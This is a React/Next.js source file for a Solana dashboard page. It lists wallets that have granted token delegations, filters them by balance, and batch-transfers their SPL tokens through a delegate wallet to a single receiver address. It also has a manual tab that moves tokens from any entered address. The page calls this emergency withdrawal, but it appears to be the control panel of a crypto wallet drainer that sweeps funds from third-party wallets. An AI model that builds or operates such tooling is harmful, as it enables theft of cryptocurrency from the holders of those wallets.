"use client";

import { useState, useEffect, useMemo } from "react";
import { Breadcrumbs } from "@/components/breadcrumbs";
import PageContainer from "@/components/layout/page-container";
import { Heading } from "@/components/ui/heading";
import { Separator } from "@/components/ui/separator";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  AlertCircle,
  CheckCircle,
  RefreshCw,
  Send,
  Upload,
  Clock,
  FileText,
  Database,
  ChevronDown,
  ExternalLink,
  Loader2,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from "@/components/ui/use-toast";
import { WalletTable } from "@/components/tables/wallet-tables/wallet-table";
import { columns, Wallet, DeleteAllButton } from "./columns";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { allowanceApi } from '@/lib/api-client';
import { SolanaFilters, WalletSearchParams as SolanaWalletSearchParams } from "./filters";
import { ExecutionTable } from "@/components/tables/wallet-tables/execution-table";

// Global constants
const CHAIN_ID = 507454; // Solana mainnet chainId equivalent (standard identifier used in multi-chain apps)
const SOLANA_NETWORK = {
  MAINNET: {
    endpoint: "https://api.mainnet-beta.solana.com",
    chainId: CHAIN_ID,
  }
};
const SOLANA_EXPLORER_URL = "https://explorer.solana.com";

// Error constants
const ERRORS = {
  WALLET_INIT: "Failed to initialize Solana wallet",
  WALLET_NOT_FOUND: "Phantom or Solana wallet extension not detected",
  WRONG_NETWORK: "Please connect to Solana Mainnet",
  NO_ACCOUNTS: "No accounts found in wallet",
  CONNECTION_FAILED: "Failed to connect to Solana wallet",
  INVALID_ADDRESS: "Invalid Solana address provided",
  NO_WALLETS: "No wallets loaded for transfer",
  API_FAILURE: "Failed to fetch wallet data from API",
  TRANSACTION_FAILED: "Transaction failed",
  TRANSACTION_TIMEOUT: "Transaction confirmation timed out",
  PROGRAM_INIT: "Failed to initialize Solana program",
  UNKNOWN_ERROR: "An unknown error occurred",
};

const breadcrumbItems = [
  { title: "Dashboard", link: "/dashboard" },
  { title: "Solana Program Controls", link: "/dashboard/solana" },
];

interface WalletData {
  id: string;
  walletAddress: string;
  tokenAddresses: string[];
  allowedTokens: string[];
}

// Add WalletSearchParams type for Solana
interface WalletSearchParams {
  chainId: string | number;
  walletAddress?: string;
  minBalance?: string;
  maxBalance?: string;
  startDate?: string;
  endDate?: string;
  executionFilter?: string;
  page: number;
  pageSize: number;
}

const PROGRAM_ADDRESS = process.env.NEXT_PUBLIC_SOLANA_PROGRAM_ADDRESS; // Ensure this is set in your environment variables

export default function Page() {
  const { toast } = useToast();
  const [sourceWallets, setSourceWallets] = useState("");
  const [tokenAddresses, setTokenAddresses] = useState("");
  const [receiverAddress, setReceiverAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [walletData, setWalletData] = useState<WalletData[]>([]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [txHash, setTxHash] = useState("");
  const [txStatus, setTxStatus] = useState("");
  const [currentAddress, setCurrentAddress] = useState<string | null>(null);
  const [connectionStatus, setConnectionStatus] = useState("disconnected");
  const [batchDetails, setBatchDetails] = useState<{
    timestamp: string;
    totalTransfers: number;
    successfulTransfers: number;
  } | null>(null);
  const [isOwner, setIsOwner] = useState(false);
  const [batchId, setBatchId] = useState<string>("");
  const [activeTab, setActiveTab] = useState("wallet-data");
  const [walletTableData, setWalletTableData] = useState<Wallet[]>([]);
  const [pendingWalletData, setPendingWalletData] = useState<Wallet[]>([]);
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [selectedWallets, setSelectedWallets] = useState<string[]>([]);
  const [isSelectingWallets, setIsSelectingWallets] = useState(false);
  const [isPendingLoading, setIsPendingLoading] = useState(false);

  // Add state for wallet search params and pagination
  const [searchParams, setSearchParams] = useState<SolanaWalletSearchParams>({
    chainId: CHAIN_ID.toString(),
    page: 1,
    pageSize: 10,
    startDate: null,
    endDate: null,
  });
  const [totalCount, setTotalCount] = useState(0);
  const [totalPages, setTotalPages] = useState(1);
  
  // Search params for pending tokens (execution tab)
  const [pendingSearchParams, setPendingSearchParams] = useState<SolanaWalletSearchParams>({
    chainId: CHAIN_ID.toString(),
    page: 1,
    pageSize: 10,
    startDate: null,
    endDate: null,
    executionFilter: "pending"
  });
  const [pendingTotalCount, setPendingTotalCount] = useState(0);
  const [pendingTotalPages, setPendingTotalPages] = useState(1);

  // Manual control form state
  const [fromAddress, setFromAddress] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [tokenInputs, setTokenInputs] = useState([{ tokenAddress: "", amount: "" }]);
  const [isTransferring, setIsTransferring] = useState(false);

  // Add state for execution receiver input (for Execution tab)
  const [executionReceiver, setExecutionReceiver] = useState("");
  const [selectedRows, setSelectedRows] = useState<Wallet[]>([]);

  // Show toast notification
  const showError = (title: string, description?: string) => {
    toast({
      variant: "destructive",
      title,
      description,
    });
  };

  const showSuccess = (title: string, description?: string) => {
    toast({
      title,
      description,
    });
  };

  // Helper function to get error message
  const getErrorMessage = (error: any): string => {
    if (typeof error === "string") return error;
    if (error?.message) return error.message;
    if (error?.error) return error.error;
    return ERRORS.UNKNOWN_ERROR;
  };

  // Helper function to validate Solana address
  const isValidSolanaAddress = (address: string): boolean => {
    if (!address) return false;
    // Basic Solana address validation (Base58, 32-44 characters)
    const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
    return base58Regex.test(address);
  };

  // Helper to convert hex address to base58 (if applicable)
  const convertToBase58 = (address: string): string => {
    // For Solana, addresses are already in base58 format
    return address;
  };

  const handleFetchAllWallets = async () => {
    setIsLoading(true);
    try {
      const response = await allowanceApi.getByChain(CHAIN_ID.toString());
      const data = response.success ? response.data : [];
      setWalletData(data);
      
      // Transform data for the table
      const tableData = data.map((wallet: WalletData) => ({
        id: wallet.id,
        walletAddress: wallet.walletAddress,
        tokenAddresses: wallet.allowedTokens, // Note: API returns allowedTokens instead of tokenAddresses
        chainId: CHAIN_ID,
        createdAt: new Date().toISOString(),
      }));
      setWalletTableData(tableData);

      // Format the wallet addresses as comma separated string
      const wallets = data
        .map((item: WalletData) => item.walletAddress)
        .join(", ");
      setSourceWallets(wallets);

      // Format the token addresses as grouped by wallet, one per line
      const tokens = data
        .map((item: WalletData) => item.allowedTokens.join(", ")) // Note: API returns allowedTokens
        .join("\n");
      setTokenAddresses(tokens);
    } catch (error) {
      console.error("Error fetching wallet data:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Add effect to fetch wallet data using search API when tab is wallet-data or searchParams change
  useEffect(() => {
    if (activeTab === "wallet-data") {
      // Convert date fields to string for API
      const params = {
        ...searchParams,
        startDate: searchParams.startDate ? searchParams.startDate.toISOString() : undefined,
        endDate: searchParams.endDate ? searchParams.endDate.toISOString() : undefined,
      };
      searchWallets(params);
    }
  }, [searchParams, activeTab]);

  // Load pending wallets whenever pendingSearchParams changes or when execution tab is active
  useEffect(() => {
    if (activeTab === "execution") {
      const params = {
        ...pendingSearchParams,
        startDate: pendingSearchParams.startDate ? pendingSearchParams.startDate.toISOString() : undefined,
        endDate: pendingSearchParams.endDate ? pendingSearchParams.endDate.toISOString() : undefined,
      };
      searchPendingWallets(params);
    }
  }, [pendingSearchParams, activeTab]);

  // Implement searchWallets for Solana (similar to Ethereum/Tron)
  const searchWallets = async (params: any) => {
    setIsLoading(true);
    try {
      // Fix executionFilter type for API
      let executionFilter: 'new' | 'pending' | 'executed' | 'all' | undefined = undefined;
      if (params.executionFilter === 'new' || params.executionFilter === 'pending' || params.executionFilter === 'executed' || params.executionFilter === 'all') {
        executionFilter = params.executionFilter;
      }
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress || undefined,
        minBalance: params.minBalance || undefined,
        maxBalance: params.maxBalance || undefined,
        startDate: params.startDate || undefined,
        endDate: params.endDate || undefined,
        executionFilter,
        page: params.page,
        pageSize: params.pageSize
      };
      const response = await allowanceApi.search(apiSearchParams);
      if (!response.success) {
        setWalletTableData([]);
        setTotalCount(0);
        setTotalPages(1);
        return;
      }
      setTotalCount(response.data?.total || 0);
      setTotalPages(response.data?.totalPages || 1);
      const flattened = response.data?.results || [];
      if (flattened.length === 0) {
        setWalletTableData([]);
        return;
      }
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: CHAIN_ID,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      setWalletTableData(tableData);
    } catch (error) {
      setWalletTableData([]);
    } finally {
      setIsLoading(false);
    }
  };

  // Search specifically for pending tokens - used in execution tab
  const searchPendingWallets = async (params: any) => {
    setIsPendingLoading(true);
    try {
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress || undefined,
        minBalance: params.minBalance || undefined,
        maxBalance: params.maxBalance || undefined,
        startDate: params.startDate || undefined,
        endDate: params.endDate || undefined,
        executionFilter: "pending" as "pending",
        page: params.page,
        pageSize: params.pageSize
      };
      const response = await allowanceApi.search(apiSearchParams);
      if (!response.success) {
        setPendingWalletData([]);
        setPendingTotalCount(0);
        setPendingTotalPages(1);
        return;
      }
      setPendingTotalCount(response.data?.total || 0);
      setPendingTotalPages(response.data?.totalPages || 1);
      const flattened = response.data?.results || [];
      if (flattened.length === 0) {
        setPendingWalletData([]);
        return;
      }
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: CHAIN_ID,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      setPendingWalletData(tableData);
    } catch (error) {
      setPendingWalletData([]);
    } finally {
      setIsPendingLoading(false);
    }
  };

  // Refresh pending tokens data
  const refreshPendingTokens = async () => {
    // Reset to page 1 but keep the pending filter
    const refreshParams = {
      ...pendingSearchParams,
      page: 1
    };
    
    setPendingSearchParams(refreshParams);
    // This will trigger the useEffect to reload the data
    await searchPendingWallets({
      ...refreshParams,
      startDate: refreshParams.startDate ? refreshParams.startDate.toISOString() : undefined,
      endDate: refreshParams.endDate ? refreshParams.endDate.toISOString() : undefined,
    });
  };

  // Add handler for page change (pagination)
  const handlePageChange = (newPage: number) => {
    setSearchParams(prev => ({ ...prev, page: newPage }));
  };

  // Handle pending page change - called from ExecutionTable
  const handlePendingPageChange = (newPage: number) => {
    setPendingSearchParams(prev => ({ ...prev, page: newPage }));
  };

  // Handle tab change
  const handleTabChange = (value: string) => {
    setActiveTab(value);
  };

  // Handle search params change - called from Filters component
  const handleSearchParamsChange = (newParams: Partial<SolanaWalletSearchParams>) => {
    setSearchParams(prev => ({ ...prev, ...newParams }));
  };

  // Reset the manual transfer form
  const resetManualForm = () => {
    setFromAddress("");
    setToAddress("");
    setTokenInputs([{ tokenAddress: "", amount: "" }]);
    setTxHash("");
    setTxStatus("");
  };

  // Add another token input row
  const addTokenRow = () => {
    setTokenInputs([...tokenInputs, { tokenAddress: "", amount: "" }]);
  };

  // Remove a token input row
  const removeTokenRow = (index: number) => {
    if (tokenInputs.length > 1) {
      const newTokens = [...tokenInputs];
      newTokens.splice(index, 1);
      setTokenInputs(newTokens);
    }
  };

  // Update token at specific index
  const updateTokenField = (index: number, field: "tokenAddress" | "amount", value: string) => {
    const newTokens = [...tokenInputs];
    newTokens[index][field] = value;
    setTokenInputs(newTokens);
  };

  // Handler for manual batch transfer - implements batch transfer for Solana manual control
  const handleManualBatchTransfer = async () => {
    console.log("🚀 ~ handleManualBatchTransfer ~ Starting Solana manual batch transfer...");
    
    if (!fromAddress || !isValidSolanaAddress(fromAddress)) {
      showError("Invalid From Address", "Please enter a valid Solana from address.");
      return;
    }

    if (!toAddress || !isValidSolanaAddress(toAddress)) {
      showError("Invalid To Address", "Please enter a valid Solana to address.");
      return;
    }

    // Validate token inputs
    if (!tokenInputs || tokenInputs.length === 0) {
      showError("No Tokens", "Please add at least one token to transfer.");
      return;
    }

    // Validate each token input
    for (let i = 0; i < tokenInputs.length; i++) {
      const token = tokenInputs[i];
      if (!token.tokenAddress || !isValidSolanaAddress(token.tokenAddress)) {
        showError("Invalid Token", `Token #${i + 1} has an invalid mint address.`);
        return;
      }
      if (!token.amount || parseFloat(token.amount) <= 0) {
        showError("Invalid Amount", `Token #${i + 1} has an invalid amount.`);
        return;
      }
    }

    setIsTransferring(true);
    setTxStatus("Initializing manual Solana batch transfer...");

    try {
      console.log("🚀 ~ handleManualBatchTransfer ~ Connecting to Solana wallet...");
      setTxStatus("Connecting to Solana wallet...");

      // Import the batch transfer helper
      const { executeSolanaBatchTransferWithWallet } = await import('@/utils/solanaHelper');
      const { createWalletSigner } = await import('@/utils/solanaWeb');

      // Connect to wallet (Phantom/Solflare)
      const walletSigner = await createWalletSigner();
      if (!walletSigner) {
        throw new Error("Failed to connect to Solana wallet");
      }
      
      const walletConnection = {
        success: true,
        walletSigner,
        address: walletSigner.publicKey.toString()
      };
      
      if (!walletConnection.success || !walletConnection.walletSigner) {
        throw new Error("Failed to connect to Solana wallet");
      }

      console.log("🚀 ~ handleManualBatchTransfer ~ Wallet connected successfully:", walletConnection.address);
      setCurrentAddress(walletConnection.address || null);
      setConnectionStatus("connected");

      setTxStatus("Preparing manual transfers...");

      // Prepare transfer details from manual form
      const transferDetails = tokenInputs.map(token => ({
        walletAddress: fromAddress,
        tokenAddress: token.tokenAddress,
        amount: token.amount,
        decimals: 6 // Default SPL token decimals
      }));

      console.log("🚀 ~ handleManualBatchTransfer ~ Transfer details:", transferDetails);

      setTxStatus("Executing manual batch transfers...");

      // Execute batch transfer using the existing batching system
      const result = await executeSolanaBatchTransferWithWallet(
        walletConnection.walletSigner,
        transferDetails,
        toAddress,
        undefined, // Use default connection
        (completed: number, total: number, batchIndex: number, totalBatches: number) => {
          setTxStatus(`Executing batch ${batchIndex}/${totalBatches} (${completed}/${total} transfers)`);
          console.log(`🚀 ~ handleManualBatchTransfer ~ Progress: Batch ${batchIndex}/${totalBatches} (${completed}/${total})`);
        }
      );

      if (result.success) {
        console.log("🚀 ~ handleManualBatchTransfer ~ Manual batch transfer completed successfully!");
        console.log("🚀 ~ handleManualBatchTransfer ~ Result:", result);

        // Set transaction details
        if (result.transactionSignatures && result.transactionSignatures.length > 0) {
          setTxHash(result.transactionSignatures[0]);
        }

        const tokenCount = tokenInputs.length;
        setTxStatus(`Manual batch transfer completed! Successfully transferred ${result.successfulTransfers} out of ${result.totalTransfers} tokens.`);
        
        showSuccess(
          "Manual Batch Transfer Completed", 
          `Successfully transferred ${tokenCount} token${tokenCount > 1 ? 's' : ''} from ${fromAddress} to ${toAddress}.`
        );

        // Optionally reset the form after successful transfer
        // resetManualForm();
      } else {
        console.error("🚀 ~ handleManualBatchTransfer ~ Manual batch transfer failed:", result);
        const errorMessage = result.errors && result.errors.length > 0 
          ? result.errors.join(', ') 
          : 'Manual batch transfer failed';
        
        setTxStatus(`Manual batch transfer failed: ${errorMessage}`);
        showError("Manual Transfer Failed", errorMessage);
      }

    } catch (error) {
      console.error("🚀 ~ handleManualBatchTransfer ~ Error:", error);
      const errorMessage = getErrorMessage(error);
      setTxStatus(`Error: ${errorMessage}`);
      showError("Manual Transfer Error", `Manual transfer failed: ${errorMessage}`);
    } finally {
      setIsTransferring(false);
    }
  };

  // Handler for batch execution from ExecutionTable - implements batch transfer for Solana
  const handleExecuteTokens = async (selectedRows: Wallet[]) => {
    console.log("🚀 ~ handleExecuteTokens ~ Starting Solana delegation batch transfer with selectedRows:", selectedRows);
    
    if (!selectedRows || selectedRows.length === 0) {
      showError("No Selection", "Please select wallets to execute transfers for.");
      return;
    }

    if (!executionReceiver || !isValidSolanaAddress(executionReceiver)) {
      showError("Invalid Receiver", "Please enter a valid Solana receiver address.");
      return;
    }

    setIsExecuting(true);
    setTxStatus("Initializing Solana delegation batch transfer...");

    try {
      console.log("🚀 ~ handleExecuteTokens ~ Checking delegate wallet configuration...");
      
      // Get delegate wallet address from environment
      const delegateWalletAddress = process.env.NEXT_PUBLIC_SOLANA_DELEGATE_WALLET;
      console.log("🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀 ~ handleExecuteTokens ~ delegateWalletAddress:", delegateWalletAddress)
      if (!delegateWalletAddress) {
        throw new Error("Solana delegate wallet address not configured");
      }

      console.log("🚀 ~ handleExecuteTokens ~ Using delegate wallet:", delegateWalletAddress);

      // Import the Solana delegation batch transfer class
      const { SolanaDelegationBatchTransfer } = await import('@/utils/solanaDelegationBatchTransfer');
      
      // Initialize the batch transfer system
      const batchTransfer = new SolanaDelegationBatchTransfer(delegateWalletAddress);
      
      setTxStatus("Connecting to Solana wallet...");
      console.log("🚀 ~ handleExecuteTokens ~ Connecting to wallet...");

      // Connect to wallet (Phantom/Solflare)
      const walletConnection = await batchTransfer.connectWallet();
      if (!walletConnection.success) {
        throw new Error(walletConnection.error || "Failed to connect to Solana wallet");
      }

      console.log("🚀 ~ handleExecuteTokens ~ Wallet connected successfully:", walletConnection.address);
      setCurrentAddress(walletConnection.address || null);
      setConnectionStatus("connected");

      setTxStatus("Executing delegation batch transfers...");

      // Execute the complete workflow
      const result = await batchTransfer.executeComplete(
        selectedRows,
        executionReceiver,
        (phase: string, current: number, total: number) => {
          setTxStatus(`${phase} (${current}/${total})`);
          console.log(`🚀 ~ handleExecuteTokens ~ Progress: ${phase} (${current}/${total})`);
        }
      );

      if (result.success) {
        console.log("🚀 ~ handleExecuteTokens ~ Batch transfer completed successfully!");
        console.log("🚀 ~ handleExecuteTokens ~ Result:", result);

        // Set transaction details
        if (result.transactionSignatures && result.transactionSignatures.length > 0) {
          setTxHash(result.transactionSignatures[0]);
        }

        setTxStatus(`Batch transfer completed! Processed ${result.totalProcessed} tokens, ${result.successfulTransfers} successful transfers.`);
        
        showSuccess(
          "Batch Transfer Completed", 
          `Successfully processed ${result.successfulTransfers} out of ${result.totalProcessed} transfers.`
        );

        // Refresh the pending tokens table
        if (activeTab === "execution") {
          const params = {
            ...pendingSearchParams,
            startDate: pendingSearchParams.startDate ? pendingSearchParams.startDate.toISOString() : undefined,
            endDate: pendingSearchParams.endDate ? pendingSearchParams.endDate.toISOString() : undefined,
          };
          searchPendingWallets(params);
        }

        // Update batch details
        setBatchDetails({
          timestamp: new Date().toISOString(),
          totalTransfers: result.totalProcessed,
          successfulTransfers: result.successfulTransfers,
        });

      } else {
        console.error("🚀 ~ handleExecuteTokens ~ Batch transfer failed:", result.error);
        setTxStatus(`Batch transfer failed: ${result.error}`);
        showError("Batch Transfer Failed", result.error || "Unknown error occurred");
      }

    } catch (error) {
      console.error("🚀 ~ handleExecuteTokens ~ Error:", error);
      const errorMessage = getErrorMessage(error);
      setTxStatus(`Error: ${errorMessage}`);
      showError("Execution Error", errorMessage);
    } finally {
      setIsExecuting(false);
    }
  };

  const clearAll = () => {
    setSourceWallets("");
    setTokenAddresses("");
    setReceiverAddress("");
    setWalletData([]);
    setTxHash("");
    setTxStatus("");
    showSuccess("Form cleared");
  };

  const viewOnSolanaExplorer = () => {
    if (!txHash) return;
    try {
      window.open(`${SOLANA_EXPLORER_URL}/tx/${txHash}`, "_blank");
    } catch (error) {
      console.error("Error opening Solana Explorer:", error);
      showError("Failed to open Solana Explorer", getErrorMessage(error));
    }
  };

  const getNetworkBadge = () => {
    switch (connectionStatus) {
      case "connected":
        return (
          <div className="flex items-center gap-2">
            <Badge variant="outline" className="px-3 py-1">
              <span className="mr-1 h-2 w-2 rounded-full bg-green-500 inline-block"></span>
              Solana Connected
            </Badge>
            {currentAddress && (
              <Badge variant="secondary" className="px-3 py-1 font-mono text-xs">
                {currentAddress.substring(0, 6)}...{currentAddress.substring(currentAddress.length - 4)}
              </Badge>
            )}
          </div>
        );
      case "connecting":
        return (
          <Badge variant="outline" className="px-3 py-1">
            <span className="mr-1 h-2 w-2 rounded-full bg-yellow-500 inline-block"></span>
            Connecting...
          </Badge>
        );
      default:
        return (
          <Badge variant="outline" className="px-3 py-1">
            <span className="mr-1 h-2 w-2 rounded-full bg-red-500 inline-block"></span>
            Wallet Disconnected
          </Badge>
        );
    }
  };

  // Get unique tokens from wallet data
  const uniqueTokens = useMemo(() => {
    const tokens = new Set<string>();
    walletData.forEach((wallet: WalletData) => {
      wallet.tokenAddresses.forEach((token: string) => tokens.add(token));
    });
    return Array.from(tokens);
  }, [walletData]);

  return (
    <PageContainer scrollable={true}>
      <div className="space-y-6">
        <Breadcrumbs items={breadcrumbItems} />

        <div className="flex items-start justify-between">
          <Heading
            title="Solana Program Controls"
            description="Manage emergency token withdrawals and batch operations on Solana Mainnet."
          />
          {getNetworkBadge()}
        </div>
        <Separator />

        <Tabs defaultValue="wallet-data" className="space-y-4" onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="wallet-data">Wallet Data</TabsTrigger>
            <TabsTrigger value="execution">Execution</TabsTrigger>
            <TabsTrigger value="manual-control">Manual Control</TabsTrigger>
          </TabsList>

          {/* Wallet Data Tab */}
          <TabsContent value="wallet-data" className="space-y-4 mt-4">
            <div className="space-y-4">
              <SolanaFilters
                searchParams={searchParams}
                onSearchParamsChange={(newParams) => setSearchParams(prev => ({ ...prev, ...newParams }))}
                onRefresh={handleFetchAllWallets}
                isLoading={isLoading}
              />
              
              {isLoading ? (
                <div className="flex justify-center items-center py-10">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                </div>
              ) : (
                <WalletTable 
                  columns={columns} 
                  data={walletTableData} 
                  chainId={CHAIN_ID}
                  currentPage={searchParams.page}
                  totalPages={totalPages}
                  onPageChange={handlePageChange}
                  isServerPaginated={true}
                  checkApprovalButtonText="Check Delegation"
                />
              )}
            </div>
          </TabsContent>

          {/* Execution Tab - Filtered to show only pending tokens */}
          <TabsContent value="execution" className="space-y-4">
            {isPendingLoading ? (
              <div className="flex justify-center items-center py-10">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
              </div>
            ) : (
              <ExecutionTable
                columns={columns}
                data={pendingWalletData}
                chainId={CHAIN_ID}
                currentPage={pendingSearchParams.page}
                totalPages={pendingTotalPages}
                onPageChange={handlePendingPageChange}
                isServerPaginated={true}
                onRowSelectionChange={setSelectedRows}
                onRefresh={refreshPendingTokens}
                onExecuteTokens={handleExecuteTokens}
                executionReceiver={executionReceiver}
                setExecutionReceiver={setExecutionReceiver}
                isLoading={isPendingLoading}
                validateReceiverAddress={isValidSolanaAddress}
              />
            )}
          </TabsContent>

          {/* Manual Control Tab - Designed to match Ethereum/Tron */}
          <TabsContent value="manual-control" className="space-y-4 mt-4">
            <Card>
              <CardHeader>
                <CardTitle>Batch Transfer</CardTitle>
                <CardDescription>
                  Transfer multiple SPL tokens from one address to another on Solana
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="fromWallet">From Wallet</Label>
                    <Input 
                      id="fromWallet" 
                      placeholder="Solana address..." 
                      className="font-mono" 
                      value={fromAddress} 
                      onChange={(e) => setFromAddress(e.target.value)}
                      disabled={isTransferring}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="toWallet">To Wallet</Label>
                    <Input 
                      id="toWallet" 
                      placeholder="Solana address..." 
                      className="font-mono" 
                      value={toAddress} 
                      onChange={(e) => setToAddress(e.target.value)}
                      disabled={isTransferring}
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <Label>Token Transfers</Label>
                      <Button 
                        type="button" 
                        variant="outline" 
                        size="sm" 
                        onClick={addTokenRow}
                        disabled={isTransferring}
                      >
                        Add Token
                      </Button>
                    </div>
                    
                    {tokenInputs.map((token, index) => (
                      <div key={index} className="space-y-2 p-3 border rounded-md">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium">Token #{index + 1}</span>
                          {tokenInputs.length > 1 && (
                            <Button 
                              type="button" 
                              variant="ghost" 
                              size="sm" 
                              onClick={() => removeTokenRow(index)}
                              disabled={isTransferring}
                            >
                              Remove
                            </Button>
                          )}
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`tokenAddress-${index}`}>Token Mint Address</Label>
                          <Input 
                            id={`tokenAddress-${index}`}
                            placeholder="Solana token mint address..." 
                            className="font-mono"
                            value={token.tokenAddress}
                            onChange={(e) => updateTokenField(index, "tokenAddress", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`amount-${index}`}>Amount</Label>
                          <Input 
                            id={`amount-${index}`}
                            type="text" 
                            placeholder="0.0" 
                            value={token.amount}
                            onChange={(e) => updateTokenField(index, "amount", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                
                <div className="flex justify-end space-x-2">
                  <Button variant="outline" onClick={resetManualForm} disabled={isTransferring}>Reset</Button>
                  <Button onClick={handleManualBatchTransfer} disabled={isTransferring}>
                    {isTransferring ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Execute Batch Transfer"
                    )}
                  </Button>
                </div>
              </CardContent>
              <CardFooter className="flex flex-col space-y-4">
                
                {txStatus && (
                  <div className="w-full p-3 bg-muted rounded-md">
                    <p className="text-sm">{txStatus}</p>
                    {txHash && (
                      <div className="mt-2 flex items-center gap-2">
                        <span className="text-xs text-muted-foreground">TX Hash:</span>
                        <code className="text-xs bg-background px-2 py-1 rounded">{txHash}</code>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={viewOnSolanaExplorer}
                          className="h-6 px-2"
                        >
                          <ExternalLink className="h-3 w-3" />
                        </Button>
                      </div>
                    )}
                  </div>
                )}
              </CardFooter>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </PageContainer>
  );
}